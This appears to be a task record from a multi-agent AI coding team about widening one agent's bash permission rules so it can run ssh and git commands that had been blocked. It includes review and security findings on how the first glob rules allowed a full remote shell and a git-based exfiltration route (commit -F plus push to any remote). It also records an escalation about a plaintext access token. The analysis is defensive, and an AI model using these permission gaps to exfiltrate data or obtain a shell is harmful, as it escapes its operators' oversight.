# TASK-0014 — Vector agent: extend bash permissions to finish TASK-0013 DoD items

> **Section order below is fixed.** Each agent writes to its own section and no other. `Robotnik`
> reads only `## Status` and `## Next Actions`. Do not reorder, rename, or remove sections.

- **Created:** 2026-08-28

---

## Status

*Owner: `Robotnik`. Keep this SHORT and CURRENT — it is one of only two sections the PM reads, so a
stale entry means the whole loop runs on bad information.*

**Now:** TASK-0013's `Vector` turn wrote the README section and `## Docs`, but Vector's loaded
bash set (exact `git status`, `git log*`, `git diff*`, `rg *` only) blocked the remaining DoD
items: `ssh howard@192.168.1.106` fact verification and `git add`/`commit`/`push`/`ls-remote`
ship. Vector recorded both gaps in TASK-0013 `## Docs` ("Could not verify", "Commit status").
This task extends `.opencode/agents/vector.md` with five narrow allow rules. The change takes
effect on the next opencode restart (config loads at start, no hot reload). The current session
ships the uncommitted TASK-0013 work via `Knuckles`; the new ssh channel is usable by `Vector`
from the next session on.

**Environment / scope:**
- Files in scope: `.opencode/agents/vector.md` (permission block only)
- Touches the DB schema: no
- Graphical UI: no
- Rocky Linux target: no (team config, not a target project)

**Decisions (Robotnik, 2026-08-28):**
- No `Amy` plan phase: the fix is fully specified in `## Definition of Done`; no design decision
  remains.
- `Vector` doc step skipped: Tails greps README.md for a per-agent permission section and records
  the outcome in `## Docs` (update if it exists, "checked, no change" if not).
- `Big` N/A: config-only change, no executable code; Tails records the frontmatter parse check.
- Ship (commit + push) runs in the `Tails` implementation turn, not `Knuckles`: five-line internal
  config change, standing push permission to metalllinux repos (user, 2026-08-21), single-slot
  economy. The review chain (Shadow → Omega) runs after push, against the pushed commit. A broken
  agent file cannot affect the running session (config is already loaded); worst case is a failed
  next start, reverted by one commit.
- The PM role is `edit`-denied outside `planning/**` in the loaded config. The prior session's
  attempt to edit this file directly was blocked by the permission system; this task exists
  because of that boundary, not despite it.
- Pattern semantics: bash patterns are globs on the command string, last matching rule wins,
  broad rules first. Verified against the opencode permission reference before writing the DoD.

**Tails turn complete 2026-08-28:** five rules added (`.opencode/agents/vector.md:21-25`),
frontmatter parse check PASS (10 rules in order), README agent-catalogue row updated (line 34,
was stale "read-only git"). Tails found the tree dirty with unshipped TASK-0013 work and shipped
it in the same commit (mixed scope stated in the message) — see TASK-0013 Status. Pushed as
`9e1f0c9`, verification recorded in `ad9632c`; local HEAD == remote main == `ad9632c`. Review
chain (Shadow → Omega) now runs against the pushed state.

**Review round 1 complete 2026-08-28:** Shadow: no blockers, no should-fix, one nit (the
`ad9632c` re-verification output line is missing from `## Implementation`; Knuckles' `## Release`
re-verification covers it). Omega: three high findings. H-1: a live GitHub PAT in plaintext at
`~/.gitconfig:3` (`url.insteadOf` rewrite, pre-existing, user-documented at
`planning/docs/SETUP.md:143-146`, team-wide exposure via any agent with bash + read, not created
by this diff; verified absent from the worktree and repo history). Fix is user-owned: rotate the
token, then de-embed it from the rewrite. **Escalated to the user 2026-08-28 per AGENTS.md §4;
fix owner: user; this task blocks on it for the Omega DoD box.** H-2: `ssh howard@192.168.1.106*`
is a full remote shell (sudo available on that host); no glob can express read-only remote
commands. H-3: `git add*` + `git commit*` + `git push*` form an exfil pipeline (`commit -F` +
push to an arbitrary remote) and admit `--force`/`--delete`.

**Decision (Robotnik, 2026-08-28):** amend DoD item 1 to the tightened pattern set Omega
specified (pinned push to `origin main`, `commit -m*`, pinned ls-remote, per-command exact ssh
rules); Tails reworks and pushes; re-run Shadow → Omega until clean. H-1 is out of scope of this
diff and stays open with fix owner = user; the Omega DoD box is not ticked until the user decides
(rotate + de-embed, or accept as documented residual risk).

**Review chain complete 2026-08-29:** Tails rework pushed (`15f6c29`, final `ef884e4`); Shadow
round 2 clean (round-1 nit resolved); Omega round 2: H-2 + H-3 resolved against `ef884e4`,
residuals low. All DoD boxes ticked except the Omega box, which is blocked on the user's H-1
decision. **Task is Blocked on the user (H-1 PAT).** `Knuckles` recorded `## Release` 2026-08-29
(DONE = no, missing item = user H-1 decision; final state `ef884e4`). After the decision: tick
the Omega box, commit + push, `Espio` prunes.

**Unknowns:** none load-bearing.

---

## Definition of Done

*Owner: `Robotnik`, and nobody else. Written **before** any work starts. Objectively checkable —
if a box cannot be verified by looking at something, rewrite it.*

- [x] `.opencode/agents/vector.md` `permission.bash` block contains the original five rules
      unchanged, plus exactly these allow rules (amended 2026-08-28 to resolve Omega findings
      H-2/H-3 in `## Security`), appended after `"*": deny` so they win: `"git add*"` (residual
      sweep/`--force` risk recorded low), `"git commit -m*"` (drops `-F`), `"git push origin main"`,
      `"git push -u origin main"`, `"git ls-remote"`, `"git ls-remote origin*"`, and one
      full-string exact rule per named ssh verification command (single-quoted form: `cat` of the
      user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service`). Exact
      rules fail closed on quoting variation; further ssh commands need a new rule per task.
      No other rule added, removed, or reordered; no other file in `.opencode/agents/` touched.
- [x] Frontmatter still parses as YAML and keeps the existing block's shape (quoted pattern keys,
      `allow` values); verified by a parse check and by reading the final block.
- [x] README.md agent-catalogue row (line ~34) matches the final tightened rule set (pinned push
      forms, exact ssh commands); Tails records the outcome in `## Implementation`.
- [x] Committed + pushed to `metalllinux/team-chaotix` main; local HEAD == remote HEAD
      (verified with `git ls-remote`; final state `ef884e4`).
- [x] `Shadow`: no unresolved blockers or should-fix findings in `## Review`.
- [ ] `Omega`: no unresolved findings above `low` in `## Security`; a least-privilege assessment
      of the final tightened rule set (nine new rules, incl. the exact ssh commands and pinned
      push forms) is recorded there. H-1 (live PAT in `~/.gitconfig:3`) is a user-owned
      escalation, out of scope of this diff, and stays open until the user decides; it is the
      only permitted unresolved item and keeps this box unticked until then.
- [x] `Big`: N/A — config-only change, no executable code (recorded here).

---

## Next Actions

*Owner: whoever wrote last. The future only — delete what has been done. The second of the two sections
the PM reads.*

- [x] `Tails` rework (complete 2026-08-28): tightened set pushed as `15f6c29`, final state
      `ef884e4`; `## Implementation` round 2.
- [x] `Shadow` round 2 (complete 2026-08-28): no blockers, no should-fix; round-1 nit resolved.
- [x] `Omega` round 2 (complete 2026-08-29): H-2 + H-3 resolved against `ef884e4`; residuals low.
- [ ] **User (escalation, H-1):** rotate the PAT in `~/.gitconfig:3` and de-embed it from the
      `url.insteadOf` rewrite, or accept it as documented residual risk. Unblocks the Omega DoD
      box and the task.
- [x] `Knuckles` (complete 2026-08-29): `## Release` recorded — DONE = no, missing item = user
      H-1 decision; final state `ef884e4` confirmed on the remote.
- [ ] After the user's H-1 decision: Robotnik ticks the Omega box (recording the decision in
      `## Security`'s H-1 resolution line), commits + pushes; `Espio` prunes the doc.

---

## Plan

*Owner: `Amy`.*

**Why this task exists** — the user request or issue it serves.
**What it unblocks / what blocks it** — including dependencies outside this repo.
**MVP** — the smallest version that delivers value, and what is deferred.
**What this makes harder later.**

**Work breakdown** — decomposed until one agent finishes one item in one turn.

| # | Item | Owner agent | Acceptance criterion | Parallel with |
|---|---|---|---|---|
| 1 | | | | |

**Critical path:**
**Validation:** which files, which checks, which pages need a human look. Name them.
**Rollback:** how we detect failure, the exact revert, and where the point of no return is.

---

## Implementation

*Owner: `Tails`.*

**Alternatives considered**

### Problem: the working tree was dirty with unshipped TASK-0013 work when the dispatch said commit + push
**Option A — one `TASK-0014:` commit carrying the whole tree** · How: `git add` all five dirty files and commit them together. · Pros: the dispatch says commit + push without exclusions; the TASK-0013 doc's `## Docs` "Commit status" already records that this exact work "must be committed + pushed"; leaves a clean tree. · Cons: a TASK-0014 commit carries TASK-0013 content (mitigated: recorded here and in the commit message).
**Option B — selective staging (`git add -p`)** · How: split the README hunks, stage only the line-34 row plus the agent file and the TASK-0014 doc; leave the EVO-X2 section for `Knuckles`. · Pros: commit strictly scoped to TASK-0014. · Cons: leaves the tree dirty; the new catalogue row ("ssh to 192.168.1.106") references the EVO-X2 section that would ship later; fragile hunk surgery on one file.
**Chosen:** A, because the dispatch said commit + push without exclusions, the TASK-0013 doc already records the tree as waiting on exactly this ship, and the catalogue row and the EVO-X2 section are the same documentation surface.
**Competing priorities:** commit-scope purity was traded for a clean tree. The mixed scope is stated in the commit message and in the changes table below, so it is not a surprise to the reviewer.

**Changes**

| File | What changed |
|---|---|
| `.opencode/agents/vector.md:21-25` | Added the five DoD allow rules after `"*": deny` (new lines 21-25: `"git add*"`, `"git commit*"`, `"git push*"`, `"git ls-remote*"`, `"ssh howard@192.168.1.106*"`, all `allow`). The existing five rules (line 20 deny + four allows) are untouched, original relative order preserved |
| `README.md:34` | Agent catalogue row for Vector: "Read/write docs, read-only git" → "Read/write docs, git read + add/commit/push/ls-remote, ssh to 192.168.1.106", matching the new bash block per the DoD README item |
| `README.md:395-604` (pre-existing, uncommitted at dispatch) | Vector's TASK-0013 `## EVO-X2 model host setup` section + `## Model` cross-reference sentence. Not edited this turn; shipped in the same commit per the option-A decision |
| `planning/TASKS.md` (pre-existing, uncommitted at dispatch) | Robotnik: TASK-0013 row → In Review, new TASK-0014 row. Not edited this turn; shipped in the same commit |
| `planning/docs/TASK-0013-evox2-readme-setup.md` (pre-existing, uncommitted at dispatch) | Vector's turn recorded in `## Status`, `## Next Actions`, `## Docs`. Not edited this turn; shipped in the same commit |
| `planning/docs/TASK-0014-vector-bash-permissions.md` (new) | Robotnik's task doc (untracked at dispatch); `## Implementation` filled this turn |

No other file in `.opencode/agents/` was touched. `git status --short` after the edits shows exactly the five files above, nothing else.

**Final `permission.bash` block (round 1, superseded):** the round-1 10-rule block (original 5
rules plus the five allow globs `git add*`, `git commit*`, `git push*`, `git ls-remote*`,
`ssh howard@192.168.1.106*`) was replaced by the round-2 tightened 14-rule set (full block in
the round-2 section below). The five-glob set is a rejected option; the reasons it was rejected
(full remote shell on the model host, git exfil pipeline, force-push and destructive ref
operations) live in `## Security` (Omega H-2/H-3). Full round-1 block: `## Archive`.

**Checks run**

- Frontmatter parse (PyYAML 6.0.1, `python3` heredoc): extracted the frontmatter between the `---` markers of `.opencode/agents/vector.md`, parsed with `yaml.safe_load`, asserted `list(permission['bash'].items())` equals the ten expected (pattern, effect) pairs in order, and printed the block. Result: `parse: OK (yaml.safe_load)`, `rules: 10`, `assert: block equals expected 10 rules in order: PASS`.
- README per-agent permission grep: `grep -n "permission|bash:" README.md` → three hits: line 8 (intro sentence on least-privilege permissions), line 25 (Agent catalogue table header, "Key permissions" column), line 38 ("Key permission patterns"). Outcome: README.md **does** document per-agent permission sets via the Agent catalogue (lines 25-36). Vector's row (line 34) said "read-only git", stale after this change → updated as in the changes table. The "Key permission patterns" list (lines 38-46) is generic (no per-agent bash enumeration) → checked, no change needed.
- Compile / linter / harness: n/a for a YAML frontmatter + Markdown change; the parse check above is the applicable check (DoD records `Big` as N/A).

**Commit and remote verification** — recorded in the follow-up commit, per the TASK-0011 convention (`planning/docs/TASK-0011-default-model-q4kxl.md:219`: "follow-up commit records the sha here"):

- Commit 1 (agent file + README + planning docs, 5 files, +531/-17): `9e1f0c9` (full
  `9e1f0c91579a3f9b17ec5c490041b2bb4146e3ae`), pushed with
  `git push origin main` → `d476221..9e1f0c9  main -> main`.
- `git ls-remote origin main` after the push: `9e1f0c91579a3f9b17ec5c490041b2bb4146e3ae refs/heads/main`.
  Local HEAD (`git rev-parse HEAD`) `9e1f0c91579a3f9b17ec5c490041b2bb4146e3ae` == remote HEAD. PASS.
- This follow-up commit records the above; after its push, local HEAD == remote HEAD is re-verified
  by `git ls-remote origin main` against the follow-up sha.

### Round 2 (rework, 2026-08-29) — tightened rule set per amended DoD item 1 (Omega H-2/H-3)

**Alternatives considered**

#### Problem: the amended DoD names three ssh verification commands; Omega's fix list had four
**Option A — exactly the three DoD-named exact ssh rules** (`cat` of the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service`, each a single-quoted full string per the DoD's "single-quoted form"). Pros: the amended DoD (Robotnik, 2026-08-28) pins the set verbatim and the same item says "No other rule added, removed, or reordered". Cons: the README monitoring command (README.md:577) still needs a new exact rule before `Vector` runs it.
**Option B — also add the fourth rule from Omega's starting set** (`ssh howard@192.168.1.106 'journalctl -k --no-pager | grep -cE "device wedged"'`, `## Security` fix list). Pros: covers the monitoring command too. Cons: adds a rule the DoD does not authorize; a rule beyond the DoD's pin is exactly what the review chain exists to catch.
**Chosen:** A. Fail-closed on the fourth command is the DoD's documented behavior: "further ssh commands need a new rule per task."

**Changes**

| File | What changed |
|---|---|
| `.opencode/agents/vector.md:21-29` | Replaced the five round-1 allow rules (former lines 21-25: `"git add*"`, `"git commit*"`, `"git push*"`, `"git ls-remote*"`, `"ssh howard@192.168.1.106*"`) with the nine tightened rules of amended DoD item 1, in the DoD's enumeration order. The original five rules (`"*": deny` at :20; four allows now at :30-33) are byte-identical and in their original relative order. Verified: `git diff d476221 -- .opencode/agents/vector.md` (d476221 = pre-round-1 state) is exactly nine added lines, zero removed |
| `README.md:34` | Agent catalogue row for Vector: "Read/write docs, git read + add/commit/push/ls-remote, ssh to 192.168.1.106" → "Read/write docs, git read + add + commit -m + push origin main + ls-remote, exact ssh verification commands to 192.168.1.106" (pinned push forms, exact ssh commands, per the DoD README item) |
| `planning/docs/TASK-0014-vector-bash-permissions.md` | Robotnik's post-push bookkeeping: `## Status` (review round 1 + Robotnik decision), `## Definition of Done` item 1 (amendment), `## Next Actions` (rework dispatch). Not edited this turn; shipped in the same commit per the round-1 option-A precedent |
| `planning/docs/TASK-0013-evox2-readme-setup.md` | Robotnik's post-push bookkeeping in `## Status` + `## Next Actions`. Not edited this turn; shipped in the same commit |

No other file in `.opencode/agents/` was touched. `git status --short` before the rework commit shows exactly the four files above.

**Final `permission.bash` block** (`.opencode/agents/vector.md:19-33`, read back after the edit):

```yaml
  bash:
    "*": deny
    "git add*": allow
    "git commit -m*": allow
    "git push origin main": allow
    "git push -u origin main": allow
    "git ls-remote": allow
    "git ls-remote origin*": allow
    "ssh howard@192.168.1.106 'cat ~/.config/systemd/user/llama-server-qwen3.8-27b-q4.service'": allow
    "ssh howard@192.168.1.106 'sudo firewall-cmd --list-all'": allow
    "ssh howard@192.168.1.106 'systemctl cat ryzenadj.service'": allow
    "git diff*": allow
    "git log*": allow
    "git status": allow
    "rg *": allow
```

14 rules: 1 deny + 9 new allows + 4 original allows. The ssh rule texts are full command strings including the single quotes, byte-identical to the documented verification commands (`planning/docs/TASK-0013-evox2-readme-setup.md:249,251,253-254`; Omega's fix list in `## Security`). Any other phrasing or quoting is denied (fail-closed).

**Checks run**

- Frontmatter parse (PyYAML 6.0.1, `python3` heredoc): extracted the frontmatter between the `---` markers, `yaml.safe_load`, asserted `list(permission['bash'].items())` equals the 14 expected (pattern, effect) pairs in order, printed the block. Result: `parse: OK (yaml.safe_load)`, `rules: 14`, `assert: block equals expected 14 rules in order: PASS`.
- Legacy-rule integrity: `git diff d476221 -- .opencode/agents/vector.md` is exactly the nine added lines above; the original five rules are unchanged (DoD item 1).
- Compile / linter / harness: n/a for a YAML frontmatter + Markdown change; the parse check above is the applicable check (`Big` N/A per DoD).

**Commit and remote verification** — follow-up commits per the TASK-0011 convention (`planning/docs/TASK-0011-default-model-q4kxl.md:219`: "follow-up commit records the sha here"):

- Rework commit (agent file + README + 2 planning docs, 4 files, +236/-35): `15f6c29` (full
  `15f6c29313e139d08676c309204cf104db778834`), pushed with `git push origin main` →
  `ad9632c..15f6c29  main -> main`.
- `git ls-remote origin main` after the push, actual output:
  `15f6c29313e139d08676c309204cf104db778834	refs/heads/main`.
  Local HEAD (`git rev-parse HEAD`) `15f6c29313e139d08676c309204cf104db778834` == remote HEAD. PASS.
- Follow-up commit 1 (planning doc only, +9): `152a068` (full
  `152a068a6cbb4ea1956f0e470b3a718ee248d990`), pushed with `git push origin main` →
  `15f6c29..152a068  main -> main`.
- `git ls-remote origin main` after that push, actual output:
  `152a068a6cbb4ea1956f0e470b3a718ee248d990	refs/heads/main`.
  Local HEAD (`git rev-parse HEAD`) `152a068a6cbb4ea1956f0e470b3a718ee248d990` == remote HEAD. PASS.
- After this follow-up commit's push, local HEAD == remote HEAD is re-verified with
  `git ls-remote origin main` against this commit's sha; the output line for that final state is
  quoted in `## Release` when Knuckles re-verifies (Next Actions item; the resolution path Shadow
  named in round 1 for the missing-output nit).

---

## Review

*Owner: `Shadow`. Read-only — findings only, no edits. Severity order, blockers first.*

**Reviewed state:** pushed commits `9e1f0c9` + `ad9632c` (main HEAD `ad9632cec011a5abfaeeffeb4941b40ccb878397`). At review time the working tree carried only Robotnik's post-push bookkeeping (uncommitted `## Status`/`## Next Actions` edits in the TASK-0013 and TASK-0014 docs); every other file is clean against HEAD, so `.opencode/agents/vector.md` and `README.md` were reviewed as pushed.

**Verdict: no blockers, no should-fix. One nit.**

### ls-remote output for the follow-up sha `ad9632c` is not recorded
**Severity:** nit
**Where:** `planning/docs/TASK-0014-vector-bash-permissions.md:169-170`
**Problem:** `## Implementation` quotes the `git ls-remote origin main` output for `9e1f0c9` but states the `ad9632c` re-verification without quoting its output line, and that line is recoverable nowhere else (opencode.log records permission evaluations only, and no file under `~/.local/share/opencode/tool-output/` contains it, checked by grep).
**Failure scenario:** an auditor checking the DoD box "local HEAD == remote HEAD (verified with `git ls-remote`)" from the doc alone has the command and the conclusion but not the output for the final sha, and must re-run `git ls-remote origin main` to close the loop.
**Suggested direction:** quote a fresh `git ls-remote origin main` output in `## Release` when `Knuckles` re-verifies (that Next Actions item already says so), or append the line to `## Implementation`.
**Resolution:** resolved 2026-08-29 by Shadow (round-2 re-review, per dispatch): fixed in `15f6c29` + `ef884e4`. `## Implementation` now quotes actual `git ls-remote origin main` output for `15f6c29` and `152a068`, and the terminal sha (`ef884e4`) output line is explicitly deferred to `## Release` (Knuckles), which is this finding's suggested direction. The original `ad9632c` line was not backfilled, but the chain is bracketed by quoted push output on both sides (`9e1f0c9..ad9632c` recorded PASS in round 1; `ad9632c..15f6c29` quoted in round 2), so an auditor can close the loop without re-running the command.

**Verification detail (all PASS)**

1. *Existing five rules unchanged; exactly five new rules appended after `"*": deny`; nothing else in `.opencode/agents/`. PASS.* `git diff d476221 ad9632c -- .opencode/` is exactly five added lines, `.opencode/agents/vector.md:21-25`, and no other file under `.opencode/`. Pre-change block (`git show d476221:.opencode/agents/vector.md`): `"*": deny`, `"git diff*"`, `"git log*"`, `"git status"`, `"rg *"`; all five present byte-identical at `.opencode/agents/vector.md:20,26-29`, original relative order preserved.
2. *Frontmatter parses as YAML, block shape preserved. PASS.* Tails's PyYAML check ran at 2026-08-28 14:09:24Z (command logged at opencode.log:56945, after the 14:08:33Z file edit at opencode.log:56935): `parse: OK`, `rules: 10`, order assert PASS, recorded in `## Implementation`. Shadow read the final block `.opencode/agents/vector.md:19-29`: ten rules, quoted pattern keys, `allow`/`deny` values, same shape as the block this build has loaded since 2026-08-11. Shadow did not run a second parser (no `yamllint` on host; Shadow's bash set has no general interpreter execution); gap stated, not a deviation.
3. *Rule order correct for last-match-wins. PASS.* Matcher model verified in this build from opencode.log plus controlled probes this turn: (a) the command is split into quote-aware segments and every segment must be allowed (`rg "a|b" planning/TASKS.md` allowed, the quoted `|` did not split; `git show ... && echo ... && git show ...` denied, the `echo` segment matched no allow; the compound push + ls-remote produced two segment evaluations in the same millisecond, opencode.log:56990-56994); (b) within a segment the last matching rule in file order wins (`git show d476221:...` allowed via `git show*` at `.opencode/agents/shadow.md:26`, later in the list than the also-matching `"*": deny` at `:23`); (c) patterns are anchored globs and a trailing `*` matches the empty string (bare `ruff check` allowed via `ruff check*` at `.opencode/agents/shadow.md:38`). All five new rules sit after `"*": deny` (`.opencode/agents/vector.md:21-25`) so each beats the catch-all; the five new prefixes are disjoint from each other and from the four legacy allows, so relative order among them and against the legacy rules is behaviorally irrelevant, and legacy commands (`git diff*`, `git log*`, `git status`, `rg *`) still resolve to their own later allow rule.
4. *Each pattern matches the intended commands, including bare invocations. PASS.* By (c): `git add`, `git commit`, `git push`, `git ls-remote` match bare and with arguments. By (a)+(c): `ssh howard@192.168.1.106 <cmd>` matches, including a quoted compound `<cmd>` such as `ssh howard@192.168.1.106 'journalctl -k --no-pager | grep -cE "device wedged"'` (one segment). Beyond the specified pattern text: `git push*` also covers `git push --force`, and the ssh rule covers any single-segment command on that host including bare interactive ssh; the DoD assigns the least-privilege/blast-radius assessment of all five patterns to `## Security` (Omega), where it belongs.
5. *README line matches the real rule set. PASS.* `README.md:34` now reads "Read/write docs, git read + add/commit/push/ls-remote, ssh to 192.168.1.106", which is the bash set at `.opencode/agents/vector.md:20-29` (git read = `git diff*`/`git log*`/`git status`). `rg *` is not named, but the column is a summary and the pre-change line omitted `rg *` as well; the stale "read-only git" claim is gone.
6. *Committed + pushed; local HEAD == remote HEAD. PASS (one nit above).* The two commits touch exactly the five files in the `## Implementation` changes table and nothing else in the repo; the bundled TASK-0013 content (the EVO-X2 README section, `planning/TASKS.md` rows, the TASK-0013 doc diff `git diff d476221 9e1f0c9 -- planning/docs/TASK-0013-evox2-readme-setup.md`) is Vector's recorded turn plus Robotnik's TASKS rows, nothing unexpected. Both push + ls-remote pairs ran in Tails's turn (opencode.log:56990-56994 at 14:17:32Z for `9e1f0c9`; opencode.log:57012-57016 at 14:18:44Z, the author timestamp of `ad9632c`); the `9e1f0c9` push output and ls-remote line are quoted in `## Implementation`; local `origin/main` == `ad9632c` == local HEAD (`git log origin/main`), a state only a successful push (or a fetch of an already-pushed remote) can produce, with no later push to this repo in the log.

**Effect note (not a finding):** the new rules take effect only on the next opencode restart. The current run started 2026-08-28 13:07:52Z (opencode.log:56704), before the 14:17Z push, so its in-memory Vector set is still the old five rules. Documented expectation (Status), no action.

### Round 2 (rework review, 2026-08-29)

**Reviewed state:** the reworked diff `ad9632c` → `ef884e4` (rework `15f6c29`, follow-up `152a068`, follow-up `ef884e4`; main HEAD `ef884e468614944e8ec4e75050622115d6447645`). Working tree clean at `ef884e4` (`git status`), so `.opencode/agents/vector.md`, `README.md`, and the planning docs were all reviewed as pushed.

**Verdict: no blockers, no should-fix. One nit (stale text in the unamended Omega DoD box; owner Robotnik, not Tails). Round-1 nit resolved (see its Resolution line).**

**Verification detail (all PASS)**

1. *Rule-by-rule against amended DoD item 1. PASS.* The final block at `.opencode/agents/vector.md:19-33` at `ef884e4` (read directly via `git show ef884e4:.opencode/agents/vector.md`) is, in file order: `"*": deny` (:20), `"git add*"` (:21), `"git commit -m*"` (:22), `"git push origin main"` (:23), `"git push -u origin main"` (:24), `"git ls-remote"` (:25), `"git ls-remote origin*"` (:26), the three single-quoted exact ssh rules (:27-29), `"git diff*"` (:30), `"git log*"` (:31), `"git status"` (:32), `"rg *"` (:33). That is exactly the DoD set in DoD enumeration order: `git add*` kept (residual recorded low per the DoD), `commit -m*` (drops `-F`), the two pinned push rules, bare `ls-remote` plus `ls-remote origin*`, and the three ssh commands the DoD names (`cat` of the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service`), each a full command string including the single quotes and byte-identical to Omega's full-string fix list (`## Security`, H-2 fix (a)). 14 rules = 1 deny + 9 new + 4 original allows, and no rule beyond the DoD's list. Tails's Options A/B records the deliberate refusal to add Omega's fourth ssh command (the `journalctl` monitoring one), which the DoD does not pin; fail-closed on it is the DoD's documented behavior.
2. *Original five rules unchanged; nothing else under `.opencode/`. PASS.* `git diff d476221 ef884e4 -- .opencode/` is exactly one file, `.opencode/agents/vector.md`, 9 insertions, 0 deletions: across both rounds the agent tree gained exactly the nine lines, lost nothing, and no other file was touched. The deny and the four legacy allows appear as unchanged context in both scoped diffs (`ad9632c..ef884e4` and `d476221..ef884e4`) in their original relative order.
3. *Frontmatter parses as YAML, block shape preserved. PASS.* Tails's PyYAML check ran at 2026-08-28T18:57:48Z on the real file, after the rework edit and before the 19:10:51Z push (command logged at opencode.log:57523, push evaluation at :57562); the logged expected list is exactly the 14 (pattern, effect) pairs including the three single-quoted ssh strings, and `## Implementation` records `parse: OK (yaml.safe_load)`, `rules: 14`, order assert PASS. Shadow re-read the pushed block: double-quoted keys (the ssh keys contain single quotes, which are literal inside a YAML double-quoted scalar; no `"` or `\` inside), plain `allow`/`deny` values, consistent two-space indentation, no tabs, no duplicate keys. Shadow ran no second parser (no `yamllint` on host, confirmed this turn; Shadow's bash set has no general interpreter execution); gap stated as in round 1, not a deviation.
4. *Rule order correct for last-match-wins. PASS.* Matcher semantics established in round 1 (anchored globs; last matching rule in file order wins; quote-aware segment split where every segment must be allowed; trailing `*` matches the empty string). The segment control was re-confirmed live this turn: a `&&` chain whose second segment (`git rev-parse HEAD`) matched no allow in Shadow's own set was denied in full, and bare `rg ...` commands evaluated under `rg *` (opencode.log:57717-57719). The single deny sits at :20 and all 13 allows after it, so under last-match-wins a command is allowed iff at least one allow matches. The nine new patterns are pairwise disjoint (no prefix relationship between any two) and none prefix-matches the four legacy allows, so legacy command resolution is unchanged (`git diff*`, `git log*`, `git status`, `rg *` still resolve to their own allows at :30-33) and no command can flip outcome between two allows. Every intended command resolves allow: `git add <path>`, `git commit -m "..."` (multi-`-m` included), `git push origin main`, `git push -u origin main`, bare `git ls-remote`, `git ls-remote origin main`, and the three ssh strings (one quote-aware segment each).
5. *Round-1 exfil routes no longer reachable. PASS.* (a) `git commit -F <file>` matches no allow (`git commit -m*` requires the literal `git commit -m` prefix), so the named two-command pipeline is broken at step one; bare `git commit` is denied too (shorter than the pattern). (b) Push to an arbitrary remote: `git push <url> ...`, `git push <local-path>`, `git push origin <other-ref>`, `git push origin main --force`, `git push --force origin main`, `git push origin --delete <ref>`, and `+refspec`/`--mirror` forms all fail the two exact push rules (anchored, no `*`) and are denied. The only reachable push is `git push [-u] origin main`, fast-forward to the team repo; a rewritten history cannot land, which is what makes the `git add*` and `commit -m*` residuals inert (per Omega). (c) Remote shell: only the three exact ssh strings match; bare ssh, any other payload, any quoting variant, sibling addresses (`192.168.1.1066`), and ports (`:2222`) are all denied (round-1 low finding on overmatch closed). (d) Arbitrary ls-remote URL denied (only bare and `origin*` remain; `.git/config` lists `origin` as the sole remote, so `origin*` cannot overmatch a different remote in this repo). The admitted residuals (staging via `git add*` including `--force` and sweeps, trailing flags after `-m`, ref enumeration of origin) are exactly Omega's recorded low set.
6. *README line matches the final rule set. PASS.* `README.md:34` reads "Read/write docs, git read + add + commit -m + push origin main + ls-remote, exact ssh verification commands to 192.168.1.106": pinned push forms and exact ssh commands per DoD item 3. Both stale claims are gone (round-1 "ssh to 192.168.1.106", pre-task "read-only git"). The "Key permission patterns" list (`README.md:38-46`) is generic, no per-agent bash enumeration, nothing stale. A repo-wide grep for the four round-1 pattern strings (`git commit*`, `git push*`, `git ls-remote*`, `ssh howard@192.168.1.106*`) matches only historical text in this planning doc (Status, round-1 Implementation quote at :176-179, this section's round-1 text, and the `## Security` findings, which describe the pre-rework state); no operational file references the removed rules.
7. *Committed + pushed; local HEAD == remote HEAD. PASS (terminal output line pending in `## Release` per protocol).* The three commits touch exactly the four files in the round-2 changes table (`git diff ad9632c ef884e4 --stat`: vector.md, README.md, TASK-0013 doc, TASK-0014 doc). The parent chain is linear and matches the quoted push outputs (`git log --format='%h %p'`: `15f6c29`'s parent is `ad9632c`, `152a068`'s parent is `15f6c29`), and the quoted full shas match `git log --format='%H'`. Five `git push origin main` evaluations are logged in this session (opencode.log:56990, 57012, 57562, 57591, 57611, one per commit), the `15f6c29` and `152a068` ls-remote output lines are quoted in `## Implementation`, the only `git fetch` in the log predates this task (2026-08-23, :40706), and `git status` reports main up to date with `origin/main` at HEAD `ef884e4`, a tracking-ref state only a push can produce here. The ls-remote output line for the terminal sha `ef884e4` is deferred to `## Release` (Knuckles) per the recorded TASK-0011 convention, which is the resolution path this round-1 finding named. Gap stated: Shadow could not re-run `git ls-remote` (not in Shadow's bash set), and `gh api */` cannot reach a clean branch endpoint (GitHub 404/422 on the trailing slash that rule requires; a quirk of Shadow's own rule text, not of the diff).

**Effect note (carried from round 1, still accurate):** the reworked rules take effect only on the next opencode restart. This session (run e25f36ec, started 2026-08-28T13:07:52Z) loaded the pre-task Vector file, so its in-memory Vector set is the original five rules; neither round's rules are active until the next start. Documented expectation (Status), no action.

### The unamended Omega DoD box still names the removed `ssh howard@192.168.1.106*` pattern and "the five new patterns"
**Severity:** nit
**Where:** `planning/docs/TASK-0014-vector-bash-permissions.md:97-99`
**Problem:** DoD item 6 asks for a "least-privilege assessment of the five new patterns, including the blast radius of `ssh howard@192.168.1.106*`", but the rework replaced the five patterns with nine and the ssh glob no longer exists.
**Failure scenario:** a reader (or Omega's round-2 pass) working from the box alone assesses the blast radius of a rule that no longer exists, instead of the three exact ssh rules.
**Suggested direction:** Robotnik (DoD owner; Tails cannot edit that section) rewords the box to name the final tightened set. Does not affect the Shadow DoD box and does not block.
**Resolution:** fixed in `1da994a` (that commit ships Robotnik's reworded box; the push and ls-remote lines are recorded in the TASK-0013 `## Implementation` follow-up). The DoD item now names the final tightened rule set (nine new rules, incl. the exact ssh commands and pinned push forms) and records H-1 as the only permitted unresolved item, exactly the rewording suggested.

---

## Security

*Owner: `Omega`. Read-only. Severity order.*

**Reviewed state:** `.opencode/agents/vector.md:21-25` as pushed (main HEAD `ad9632c`, change in `9e1f0c9`). Matcher semantics per `## Review` items 3-4 (Shadow, verified in this build): anchored globs, last match wins, quote-aware segment split where every segment must be allowed, a trailing `*` matches the empty string, `*` crosses `/`. I confirmed the segment rule in my own session: a compound command whose second segment (`echo`) matched no allow was denied in full, so the local splitter is a live control on unquoted local chaining. No live connection to 192.168.1.106 was made and no credential was used; claims about that host and about the token are from local files and team records, and are marked where unverified.

